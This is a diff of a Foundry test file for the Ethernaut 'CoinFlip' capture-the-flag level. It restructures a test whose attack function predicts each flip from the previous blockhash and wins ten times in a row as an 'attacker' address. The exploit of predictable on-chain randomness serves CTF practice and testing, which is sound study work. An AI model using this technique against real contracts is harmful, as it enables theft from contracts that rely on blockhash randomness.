@@ -2,24 +2,47 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
-import "openzeppelin-contracts/contracts/utils/math/SafeMath.sol";
-import "../src/3-CoinFlip.sol";
+import "./utils/BaseTest.sol";
+import "../src/Ethernaut.sol";
+import "../src/levels/3-CoinFlip/CoinFlip.sol";
+import "../src/levels/3-CoinFlip/CoinFlipFactory.sol";
 
-contract CoinFlipTest is Test {
-    using SafeMath for uint256;
+contract CoinFlipTest is Test, BaseTest {
+    CoinFlip public level;
 
-    uint256 public constant FACTOR =
-        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    constructor() {
+        levelFactory = new CoinFlipFactory();
+    }
 
-    CoinFlip public coinFlipCTF;
+    function setUp() public override {
+        super.setUp();
+        levelAddr = payable(_createLevelInstance());
+        level = CoinFlip(levelAddr);
+    }
 
-    function setUp() public {
-        coinFlipCTF = new CoinFlip();
+    function testAttack() public {
+        _attack();
+        _validateLevel();
+    }
+
+    function _attack() internal override {
+        vm.startPrank(attacker);
+
+        for (uint256 i = 0; i < 10; i++) {
+            bool nextGuess = _guessFlip(true);
+            level.flip(nextGuess);
+
+            // advance block
+            vm.roll(block.number + 1);
+        }
+
+        vm.stopPrank();
     }
 
     function _guessFlip(bool _guess) internal view returns (bool) {
-        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
-        uint256 coinFlip = blockValue.div(FACTOR);
+        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / factor;
         bool side = coinFlip == 1 ? true : false;
 
         if (side == _guess) {
@@ -28,18 +51,4 @@ contract CoinFlipTest is Test {
             return false;
         }
     }
-
-    function testAttack() public {
-        for (uint256 i = 0; i < 10; i++) {
-            bool nextGuess = _guessFlip(true);
-            coinFlipCTF.flip(nextGuess);
-
-            // advance block
-            vm.roll(block.number + 1);
-        }
-
-        assertEq(coinFlipCTF.consecutiveWins(), 10);
-    }
-
-    receive() external payable {}
 }
